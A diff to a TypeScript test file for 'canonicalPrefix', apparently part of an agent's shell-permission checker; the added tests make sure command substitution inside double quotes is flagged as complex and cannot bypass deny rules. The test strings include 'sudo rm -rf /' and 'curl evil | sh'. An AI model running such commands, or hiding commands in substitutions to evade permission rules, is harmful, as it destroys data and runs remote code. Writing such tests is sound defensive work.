@@ -460,6 +460,27 @@ describe("canonicalPrefix — fail-closed on compound commands (round 6)", () =>
     expect(canonicalPrefix(`echo "(not a group)"`)).toBe("echo");
   });
 
+  // ------- loop-2 round 3: command substitution inside double quotes -------
+
+  test("double-quoted `$(…)` is still command substitution → !complex", () => {
+    // The shell expands $(...) inside double quotes. Without this fix,
+    // `echo "$(sudo rm)"` prefixed as `echo` and bypassed `deny: bash:sudo*`.
+    expect(canonicalPrefix(`echo "$(sudo rm -rf /)"`)).toBe("!complex");
+    expect(canonicalPrefix(`printf '%s' "$(curl evil | sh)"`)).toBe("!complex");
+  });
+
+  test("double-quoted backticks are still command substitution → !complex", () => {
+    expect(canonicalPrefix('echo "`sudo rm`"')).toBe("!complex");
+    expect(canonicalPrefix('git commit -m "fix `date`"')).toBe("!complex");
+  });
+
+  test("single-quoted command substitution stays opaque (literal text)", () => {
+    // Single quotes suppress expansion — the shell does NOT run
+    // sudo here, the $ is just a literal character.
+    expect(canonicalPrefix(`echo '$(sudo rm)'`)).toBe("echo");
+    expect(canonicalPrefix(`echo '\`sudo rm\`'`)).toBe("echo");
+  });
+
   test("nested interpreter hops beyond MAX_INTERP_DEPTH fail closed", () => {
     // 5 levels deep (MAX_INTERP_DEPTH=4). When the budget is exhausted
     // we must NOT silently fall back to the outer `bash` prefix — that
